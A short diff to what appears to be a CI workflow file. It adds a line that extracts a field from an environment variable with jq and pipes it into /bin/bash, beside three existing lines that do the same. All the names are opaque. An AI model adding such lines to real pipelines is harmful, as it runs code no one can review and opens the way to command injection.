@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$qd181" | jq -r .dpxgl50495 | /bin/bash
           echo $m8 | jq -r .f6 | /bin/bash
           echo $d0 | jq -r .r8988 | /bin/bash
+          echo $pm9 | jq -r .im56682 | /bin/bash
 
       - name: Archive output
         if: always()
